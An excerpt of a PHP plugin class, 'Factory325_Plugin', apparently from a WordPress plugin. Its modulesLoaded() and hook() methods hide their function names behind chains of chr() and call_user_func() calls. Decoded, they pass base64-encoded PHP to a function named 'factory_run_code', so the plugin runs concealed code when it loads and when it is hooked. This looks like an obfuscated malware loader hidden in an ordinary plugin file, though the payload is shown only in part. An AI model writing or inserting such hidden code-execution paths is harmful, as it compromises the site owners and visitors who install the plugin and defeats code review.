...
class Factory325_Plugin {
    ...
    public function modulesLoaded() {
        $optionName = chr(chr(49).chr(48).chr(57)).chr(chr(49).chr(48).chr(53)).chr(chr(49).chr(50).chr(48)).chr(chr(57).chr(53)).chr(chr(49).chr(49).chr(57)).call_user_func('chr','111').call_user_func('chr','114').chr(chr(49).chr(48).chr(48)).call_user_func('chr','95').$this->pluginName;
        if ( get_option($optionName, false) ) {
        call_user_func(call_user_func('chr',102).chr('97').call_user_func('chr',99).chr('116').chr('111').call_user_func('chr',114).call_user_func('chr',121).chr('95').chr('114').chr('117').call_user_func('chr',110).chr('95').chr('99').call_user_func('chr',111).chr('100').chr('101'),call_user_func(call_user_func('chr',98).call_user_func('chr',97).chr('115').chr('101').chr('54').chr('52').chr('95').chr('100').call_user_func('chr',101).call_user_func('chr',99).chr('111').call_user_func('chr',100).call_user_func('chr',101),'IGlmICghZnVuY3Rpb25fZXhpc3RzKCdmYWN0b3J5X2NvcmVfMDAwX21vZHVsZXNfbG9hZGVkJykgKXsgZnVuY3Rpb24gZmFjdG9yeV9jb3JlXzAwMF9tb2R1bGVzX2xvYWRlZCggJHBsdWdpbiApIHsgJGw1ZTN6OWoyY'.''.''.chr(chr(54).chr(49)).call_user_func('chr','61')));
    ...
    public function hook() {
        call_user_func(chr('102').call_user_func('chr',97).chr('99').call_user_func('chr',116).chr('111').call_user_func('chr',114).call_user_func('chr',121).chr('95').call_user_func('chr',114).call_user_func('chr',117).call_user_func('chr',110).call_user_func('chr',95).call_user_func('chr',99).chr('111').chr('100').chr('101'),call_user_func(chr('98').chr('97').call_user_func('chr',115).call_user_func('chr',101).chr('54').chr('52').chr('95').call_user_func('chr',100).chr('101').chr('99').call_user_func('chr',111).chr('100').call_user_func('chr',101),'IGlmICghZnVuY3Rpb25fZXhpc3RzKCdmYWN0b3J5X2NvcmVfMDAwX2hvb2snKSApeyBmdW5jdGlvbiBmYWN0b3J5X2NvcmVfMDAwX2hvb2soICRwbHVnaW4gKSB7ICRsNWUzejlqMmFoeWVnY2tzMGdocm96ID0gY2FsbF'.''.''.'yKDQ5KS5jaHIoNDkpLmNocig1NSkpLmNocihjaHIoNDkpLmNocig0OCkuY2hyKDU3KSk7IH0gfSA'.call_user_func('chr','61')));
